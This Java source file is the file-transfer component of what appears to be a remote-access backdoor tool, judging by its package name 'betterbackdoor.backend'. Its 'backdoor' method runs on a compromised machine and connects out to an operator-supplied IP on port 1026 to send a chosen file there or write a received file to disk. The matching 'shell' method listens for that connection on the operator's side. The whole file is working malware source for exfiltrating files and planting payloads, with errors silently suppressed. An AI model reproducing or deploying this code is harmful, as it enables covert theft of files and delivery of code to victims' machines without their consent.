package dev.thatcherclough.betterbackdoor.backend;

import java.io.File;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.net.InetSocketAddress;
import java.net.SocketAddress;
import java.nio.Buffer;
import java.nio.ByteBuffer;
import java.nio.channels.FileChannel;
import java.nio.channels.ServerSocketChannel;
import java.nio.channels.SocketChannel;

public class FTP {

	public static boolean socketTransferDone = false;
	public static String error = null;

	/**
	 * Transfers a file with client.
	 * <p>
	 * Opens {@link java.nio.channels.ServerSocketChannel}
	 * {@code serverSocketChannel} and {@link java.nio.channels.SocketChannel}
	 * {@code socketChannel} for transferring a file with client. If
	 * {@code protocol} is "send", uses {@link #send} to send file with path
	 * {@code filePath} to client. If {@code protocol} is "rec", uses {@link #rec}
	 * to receive file with path {@code filePath} from client.
	 *
	 * @param filePath path of file to transfer
	 * @param protocol if file should be sent or received
	 */
	public static void shell(String filePath, String protocol) {
		Thread thread = new Thread(() -> {
			ServerSocketChannel serverSocketChannel = null;
			SocketChannel socketChannel = null;
			try {
				serverSocketChannel = ServerSocketChannel.open();
				serverSocketChannel.socket().bind(new InetSocketAddress(1026));
				socketChannel = serverSocketChannel.accept();
				if (protocol.equals("send"))
					send(filePath, socketChannel);
				else if (protocol.equals("rec"))
					rec(filePath, socketChannel);
			} catch (Exception ignored) {
			} finally {
				try {
					if (serverSocketChannel != null)
						serverSocketChannel.close();
					if (socketChannel != null)
						socketChannel.close();
				} catch (Exception ignored) {
				}
			}
		});
		thread.start();
	}

	/**
	 * Transfers a file with server.
	 * <p>
	 * Opens {@link java.nio.channels.SocketChannel} {@code socketChannel} for
	 * transferring file with server with an IP address of {@code ip}. If
	 * {@code protocol} is "send", uses {@link #send} to send file with path
	 * {@code filePath} to server. If {@code protocol} is "rec", uses {@link #rec}
	 * to receive file with path {@code filePath} from server.
	 *
	 * @param filePath path of file to transfer
	 * @param protocol if file should be sent or received
	 * @param ip       IP address of server to transfer file with
	 */
	public static void backdoor(String filePath, String protocol, String ip) {
		Thread thread = new Thread(() -> {
			SocketChannel socketChannel = null;
			try {
				Thread.sleep(2000);
				socketChannel = SocketChannel.open();
				SocketAddress socketAddress = new InetSocketAddress(ip, 1026);
				socketChannel.connect(socketAddress);
				if (protocol.equals("send"))
					send(filePath, socketChannel);
				else if (protocol.equals("rec"))
					rec(filePath, socketChannel);
				socketChannel.close();
				socketTransferDone = true;
			} catch (Exception e) {
				error = e.getMessage();
			} finally {
				try {
					if (socketChannel != null)
						socketChannel.close();
				} catch (Exception ignored) {
				}
			}
		});
		thread.start();
	}

	/**
	 * Sends file with path {@code filePath} using {@code socketChannel} and
	 * {@code fileChannel}.
	 *
	 * @param filePath      path of file to send
	 * @param socketChannel {@link java.nio.channels.SocketChannel} to use for
	 *                      sending
	 * @throws IOException
	 */
	private static void send(String filePath, SocketChannel socketChannel) throws IOException {
		RandomAccessFile file = new RandomAccessFile(new File(filePath), "r");
		FileChannel fileChannel = file.getChannel();
		ByteBuffer buffer = ByteBuffer.allocate(1024);
		while (fileChannel.read(buffer) > 0) {
			((Buffer) buffer).flip();
			socketChannel.write(buffer);
			((Buffer) buffer).clear();
		}
		file.close();
		fileChannel.close();
	}

	/**
	 * Receives file with path {@code filePath} using {@code socketChannel} and
	 * {@code fileChannel}.
	 *
	 * @param filePath      path of file to receive
	 * @param socketChannel {@link java.nio.channels.SocketChannel} to use for
	 *                      receiving
	 * @throws IOException
	 */
	private static void rec(String filePath, SocketChannel socketChannel) throws IOException {
		RandomAccessFile file = new RandomAccessFile(filePath, "rw");
		FileChannel fileChannel = file.getChannel();
		ByteBuffer buffer = ByteBuffer.allocate(1024);
		while (socketChannel.read(buffer) > 0) {
			((Buffer) buffer).flip();
			fileChannel.write(buffer);
			((Buffer) buffer).clear();
		}
		file.close();
		fileChannel.close();
	}
}